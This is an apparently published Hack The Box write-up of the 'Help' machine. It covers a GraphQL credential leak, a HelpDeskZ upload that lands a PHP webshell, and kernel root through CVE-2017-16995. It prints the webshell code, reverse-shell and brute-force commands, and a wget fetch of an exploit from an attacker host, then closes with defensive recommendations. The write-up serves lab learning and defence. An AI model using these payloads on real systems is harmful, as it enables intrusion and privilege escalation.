---
title: "Help — GraphQL Credential Leak to HelpDeskZ Upload RCE"
description: "A GraphQL endpoint leaks HelpDeskZ credentials and an attachment-upload weakness stores rejected PHP files under predictable names for web-service code execution; a kernel eBPF flaw (CVE-2017-16995) escalates to root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - web
  - graphql
  - helpdeskz
  - kernel-exploit
  - cve-2017-16995
objective: "Escalate from an unauthenticated GraphQL data leak and a HelpDeskZ attachment-upload weakness to web-service code execution, then to root through a kernel eBPF vulnerability."
tools:
  - rustscan
  - feroxbuster
  - curl
  - hashcat
  - python3
  - netcat
  - wget
  - gcc
skill: "Web application abuse and Linux kernel privilege escalation"
outcome: "Command execution as the web-service account via a HelpDeskZ attachment upload, then root through CVE-2017-16995"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Easy |
| Target environment | Ubuntu Linux; Apache httpd 2.4.18 and a Node.js Express service |
| Starting position | Unauthenticated network access |
| Objective | Escalate from an unauthenticated GraphQL data leak and a HelpDeskZ attachment-upload weakness to web-service code execution, then to root through a kernel eBPF vulnerability |
| Outcome | Command execution as the web-service account; root via CVE-2017-16995 |

## HelpDeskZ upload RCE to kernel eBPF root

Help is an Easy Hack The Box Linux lab running HelpDeskZ 1.0.2 on Ubuntu. The demonstrated route is an unauthenticated attachment-upload weakness that stores a rejected PHP file under a predictable hashed name and reaches command execution as the web-service account; a GraphQL endpoint also returns HelpDeskZ credential data as an alternate disclosure path. After the upload foothold, a kernel eBPF flaw (CVE-2017-16995) escalates to root. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** **Unauthenticated HelpDeskZ attachment upload → rejected PHP file stored under a predictable hashname → web-service command execution → kernel eBPF escalation (CVE-2017-16995) → root**

## Ubuntu host, HelpDeskZ 1.0.2, unauthenticated, user then root

- **Target:** a Linux (Ubuntu) host exposing SSH (22), Apache HTTP (80), and a Node.js Express service (3000); the HTTP application answers on the vhost `<TARGET_HOST>`.
- **Application:** HelpDeskZ 1.0.2 (June 2015), identified from the `/support` README, a release with known weak upload handling and SQL injection issues.
- **Starting position:** unauthenticated network access.
- **Objective:** reach user-level code execution on the web host and then escalate to root.
- **Constraints:** activity was confined to the Hack The Box lab environment.

## Evidence: GraphQL leak and upload abuse to kernel escalation

### 1. Service Discovery and Web Enumeration

Observation: a RustScan pass over the host exposes three services.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN <OUT_PREFIX>
```

```text
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu
80/tcp   open  http    Apache httpd 2.4.18
3000/tcp open  http    Node.js Express framework
```

Directory fuzzing against the virtual host locates the support application:

```bash
feroxbuster --url http://<TARGET_HOST> --wordlist <WEB_CONTENT_WORDLIST>
```

```text
/support
/support/README.md
```

Significance: the `/support` path serves HelpDeskZ, and its `README.md` identifies version 1.0.2, a 2015 release with weak upload handling, so the application exposes both an upload surface and version-specific weaknesses.

Result: HelpDeskZ 1.0.2 is installed at `/support`, reachable without authentication.

### 2. GraphQL Credential Disclosure

Observation: the service on port 3000 exposes a GraphQL endpoint whose `user` object returns credential data.

```bash
curl -s -X POST http://<TARGET_HOST>:3000/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ user { username password } }"}'
```

```json
{
  "data": {
    "user": {
      "username": "<HELPDESKZ_EMAIL>",
      "password": "<MD5_HASH>"
    }
  }
}
```

The disclosed password is an MD5 hash; a wordlist attack recovers its plaintext form:

```bash
hashcat -m 0 <HASH_FILE> <WORDLIST>
```

```text
<MD5_HASH>:<RECOVERED_PLAINTEXT>
```

Significance: an unauthenticated query returns credential material, and because the disclosed value is an MD5 hash it falls to an offline dictionary attack, so a query interface becomes a credential-disclosure primitive.

Result: one HelpDeskZ credential pair is recovered.

### 3. HelpDeskZ Attachment Upload RCE

Observation: HelpDeskZ names stored attachments from a predictable MD5 derived from the filename and server-side timestamp. The UI rejects dangerous extensions, but a rejected file still remains on disk under that hashed name.

A PHP webshell is submitted as a support-ticket attachment:

```php
<?php system($_GET['cmd']); ?>
```

A brute-force helper locates the stored name around the upload timestamp:

```bash
python3 <UPLOAD_EXPLOIT_SCRIPT> http://<TARGET_HOST>/support/ <UPLOAD_FILENAME>
```

Command execution is triggered through the stored file; the source does not capture the response to this request:

```bash
curl 'http://<TARGET_HOST>/support/uploads/tickets/<UPLOAD_HASH>.php?cmd=id'
```

A reverse shell reuses the same vector:

```bash
nc -nlvp <LISTENER_PORT>
curl 'http://<TARGET_HOST>/support/uploads/tickets/<UPLOAD_HASH>.php?cmd=<REVERSE_SHELL_COMMAND>'
```

The shell returns as the web-service account:

```text
$ id
uid=<WEB_SERVICE_UID>(<WEB_SERVICE_ACCOUNT>) gid=<WEB_SERVICE_GID>(<WEB_SERVICE_ACCOUNT>) groups=<WEB_SERVICE_GID>(<WEB_SERVICE_ACCOUNT>)
```

Significance: extension filtering at the UI is not server-side storage prevention. Because the stored name is derivable from the upload metadata, a rejected payload stays browser-reachable and an attachment upload becomes remote code execution.

Result: commands execute as `<WEB_SERVICE_ACCOUNT>`.

### 4. Kernel Enumeration and CVE-2017-16995

Observation: I checked the kernel and OS versions to place the host in the vulnerable range for CVE-2017-16995, an eBPF verifier flaw that permits local root escalation.

```bash
uname -a
lsb_release -a
```

The source records the target as Ubuntu 16.04 within the vulnerable range; the version output itself is not captured, so I could not verify it directly.

A public exploit for CVE-2017-16995 is transferred, compiled, and run:

```bash
wget http://<ATTACKER_HOST>/<EXPLOIT_SOURCE> -O <LOCAL_SOURCE>
cd /tmp && gcc <LOCAL_SOURCE> -o <LOCAL_BINARY> && chmod +x <LOCAL_BINARY> && ./<LOCAL_BINARY>
```

```text
# whoami
root
```

Significance: the vulnerability is a flaw in the eBPF verifier, so an unprivileged local process can corrupt state that the verifier should reject and gain root; the outdated kernel is the root cause.

Result: root execution is confirmed by `whoami`.

## Obstacles: two footholds, blind filename, noisy kernel exploit

| Challenge | Decision | Rationale |
|---|---|---|
| Two independent footholds exist | Used the unauthenticated attachment-upload path without relying on the recovered credentials | The upload route reached code execution directly; the GraphQL route required an offline hash recovery and was not used for access |
| Predictable but unknown stored filename | Brute-forced candidate hashes around the upload timestamp | The name is derived from the filename and server-side timestamp, so the search window is narrow and reliable |
| CVE-2017-16995 is noisy and unstable | Treated it as the intended root path on this lab host | It was the designed escalation rather than a stable real-world technique |

## Outcome: web-service command execution and kernel eBPF root

The `id` output confirms command execution as `<WEB_SERVICE_ACCOUNT>` through an attachment uploaded to HelpDeskZ 1.0.2. A separate `whoami` output confirms root through CVE-2017-16995. Limitations: the GraphQL credential pair is recovered but is not shown authenticating to HelpDeskZ.

## Recommendations: GraphQL exposure, outdated app, upload validation, kernel patching

The source does not record validation of these recommendations.

1. **Unauthenticated GraphQL data exposure.** A public query returned credential material. *Recommendation:* disable introspection and unauthenticated query access to internal services, and never expose credential fields over GraphQL. *Detection:* flag unauthenticated GraphQL requests that select sensitive fields.
2. **Outdated HelpDeskZ 1.0.2.** The 2015 release carries known upload-handling and SQL injection weaknesses. *Recommendation:* upgrade to a supported version or replace the application with maintained software. *Detection:* inventory deployed application versions and flag end-of-life releases.
3. **Server-side upload validation and predictable names.** A rejected PHP file was stored under a derivable hash and stayed reachable. *Recommendation:* enforce server-side type validation, store uploads outside the web root, and randomize stored names. *Detection:* monitor upload directories for executable file types and direct requests to them.
4. **Unpatched kernel.** The Ubuntu 16.04 kernel's eBPF verifier flaw allowed local root escalation. *Recommendation:* apply kernel security updates promptly and track hosts against known privilege-escalation CVEs. *Detection:* compare host kernel versions against vendor advisories for exploitable local bugs.

## References

- [Hack The Box — Help](https://app.hackthebox.com/machines/Help) (retired machine)
- [NVD — CVE-2017-16995](https://nvd.nist.gov/vuln/detail/CVE-2017-16995)
- [Ubuntu Security — CVE-2017-16995](https://ubuntu.com/security/CVE-2017-16995)
- [RustScan](https://github.com/RustScan/RustScan)
- [feroxbuster](https://github.com/epi052/feroxbuster)
- [hashcat](https://hashcat.net/hashcat/)
- [curl](https://curl.se/)
